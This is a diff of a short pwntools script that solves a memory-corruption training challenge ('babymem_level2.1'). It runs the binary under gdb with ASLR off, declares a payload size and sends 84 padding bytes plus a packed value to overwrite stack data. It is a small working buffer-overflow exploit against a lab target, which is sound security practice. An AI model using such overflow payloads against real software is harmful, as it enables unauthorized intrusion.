@@ -1,16 +1,25 @@
+# Example script for pwn
+
 from pwn import *
-import time
+context.terminal = ['tmux', 'new-window']
 
-#proc = process("./callme")
-proc = gdb.debug("./callme32",'b pwnme')
+#process = process('/challenge/babymem_level2.1')
 
-time.sleep(1)
-print(proc.recv())
+gdbCommand = '''
+invoke-pwndbg
+b *challenge+243
+'''
 
+process = gdb.debug('/challenge/babymem_level2.1', aslr=False, gdbscript=gdbCommand)
 
+process.recvuntil(b'Payload size:')
+process.sendline(b'100')
 
-payload = ""
+print(process.recv())
 
+process.sendline(b'a'*84 + p64(0x2C421692))
 
-proc.sendline(payload)
-proc.interactive()
+print(process.recv().decode())
+
+pause()
+process.close()
